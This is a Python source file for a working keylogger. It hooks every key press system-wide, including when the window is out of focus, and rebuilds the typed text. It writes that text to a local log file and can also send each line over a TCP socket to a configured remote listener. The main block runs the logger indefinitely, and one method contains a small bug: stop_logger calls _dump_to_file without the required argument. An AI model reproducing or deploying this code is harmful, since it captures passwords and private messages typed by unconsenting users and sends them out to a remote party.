from time import sleep, time
from datetime import datetime as dt
from shutil import copy as copyfile
from socket import socket, AF_INET, SOCK_STREAM

import keyboard
from keyboard import KeyboardEvent
try:
    from conf import SPECIAL_KEYS, SERVER_ACTIVE, SERVER_ADDR, SERVER_PORT
except ImportError:
    print("Could not find conf.py!\nTrying to copy DEFAULT config to conf.py...")
    copyfile("./DEFAULT_conf.py", "./conf.py")
    from conf import SPECIAL_KEYS, SERVER_ACTIVE, SERVER_ADDR, SERVER_PORT
    print("Successful!")


class MyKLogger:
    def __init__(self) -> None:
        self._keys: list[str] = []
        self._special_mappings = SPECIAL_KEYS

    def _log_key(self, key_event: KeyboardEvent):
        self._keys.append(key_event.name)

        if len(self._keys) >= 32 and key_event.name == "enter":
                line = self._parse_text()
                if SERVER_ACTIVE:
                    self._send_to_server(line)
                self._dump_to_file(line)

    def _parse_text(self) -> str:
        """Parses text from logged key-strokes

        Returns:
            str: Parsed string
        """
        line = ""
        last = ""
        for key in self._keys:
            if key in self._special_mappings.keys():
                last = self._special_mappings[key]
            elif key == "backspace":
                if len(last) == 0:
                    last = " "
                line = line[:-len(last)]
                last = ""
                continue
            elif len(key) > 1:
                if len(key) == 2 and key[0] == "f":
                    last = "<"+key+">"
                else:
                    last = ""
            else:
                last = key
            line += last
        return line

    def _dump_to_file(self, line: str):
        with open("./key.log", "a", encoding="UTF-8") as klog_file:
            klog_file.write(f"{dt.fromtimestamp(int(time()))}:\n{line}\n")
        self._keys = []

    def run_logger(self, duration: int):
        """Runs a key logger.
        
        This function is blocking program execution for <duration> seconds!\n
        Continues logging keys even when out of focus!
        
        Args:
            duration (int): How long the logger will run.
        """
        self.start_logger()
        sleep(duration)
        self.stop_logger()
    
    def start_logger(self):
        """Starts a key logger in the background.
        """
        keyboard.on_press(self._log_key)
    
    def stop_logger(self):
        """Stops active logger.
        """
        keyboard.unhook_all()
        self._dump_to_file()
    
    def _send_to_server(self, line: str):
        """Send parsed line to listener Server

        Args:
            line (str): Parsed text from keyboard input
        """
        line_bytes = line.encode("UTF-8")
        with socket(AF_INET, SOCK_STREAM) as sock:
            sock.connect((SERVER_ADDR, SERVER_PORT))
            sock.sendall(line_bytes)
    
    def __del__(self):
        self.stop_logger()


if __name__ == "__main__":
    klog = MyKLogger()
    klog.start_logger()
    while True:
        sleep(3600)
